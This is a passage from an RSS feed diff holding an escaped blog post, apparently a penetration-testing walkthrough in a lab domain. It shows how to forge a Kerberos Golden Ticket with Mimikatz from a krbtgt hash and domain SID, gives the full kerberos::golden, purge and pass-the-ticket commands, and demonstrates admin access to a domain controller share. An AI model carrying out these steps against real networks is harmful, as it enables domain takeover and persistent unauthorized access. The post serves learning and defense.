+&lt;ul&gt;
+&lt;li&gt;The Domains FQDN. &lt;code&gt;foo.local&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The Domains SID. &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash. &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;A username (fake or real, does not matter. Not fake if you need opsec ofc!). &lt;code&gt;darthvader&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;creating-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;creating the golden ticket&lt;/h2&gt;
+
+&lt;p&gt;Creating the golden ticket is now a really simple task. We will simply call &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!&lt;/p&gt;
+
+&lt;p&gt;For details about the command and arguments required, I referred to the &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver&#34;&gt;mimikatz wiki&lt;/a&gt; and replicated that. Our command should look something like the below, saving our golden ticket to &lt;code&gt;golden.tck&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this mimikatz command with &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; gets us our Golden Ticket:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_created.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;injecting-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;injecting the golden ticket&lt;/h2&gt;
+
+&lt;p&gt;The final test is to &lt;em&gt;use&lt;/em&gt; this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative &lt;code&gt;c$&lt;/code&gt; share of the Domain Controller!&lt;/p&gt;
+
+&lt;p&gt;Lets purge the currently cached Kerberos tickets first:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\users\bobs\downloads\golden&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;
+
+[... snip ...]
+
+mimikatz(powershell) # kerberos::purge
+Ticket(s) purge for current session is OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, we inject the golden ticket we created using the mimikatz &lt;code&gt;kerberos::ptt&lt;/code&gt; command to &lt;em&gt;&amp;lsquo;Pass The Ticket&amp;rsquo;&lt;/em&gt;:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;After the ticket is injected into memory, we can verify its existence with the mimikaz &lt;code&gt;kerberos::list&lt;/code&gt; command, or just using &lt;code&gt;klist&lt;/code&gt;. Once it is injected, we &lt;code&gt;dir&lt;/code&gt; the Domain Controllers &lt;code&gt;c$&lt;/code&gt; share&amp;hellip; an &lt;em&gt;smile&lt;/em&gt;. The password for &lt;code&gt;scvSQLServ&lt;/code&gt; can now change, it will no longer bother us!&lt;/p&gt;
+
+&lt;p&gt;
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_admin.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;conclusion&lt;/h2&gt;
+
+&lt;p&gt;In this post we saw how it is possible to &amp;lsquo;crack&amp;rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&amp;rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.&lt;/p&gt;
+
+&lt;p&gt;Then, we explored how it is possible to extract Domain Account hashes using the mimikatz &lt;em&gt;DCSync&lt;/em&gt; feature and generate a Kerberos Golden Ticket with high access levels in the domain.&lt;/p&gt;
+
+&lt;p&gt;I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&amp;hellip; Until they &amp;lsquo;fix&amp;rsquo; this stuff, thing should remain interesting for quite some time to come.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
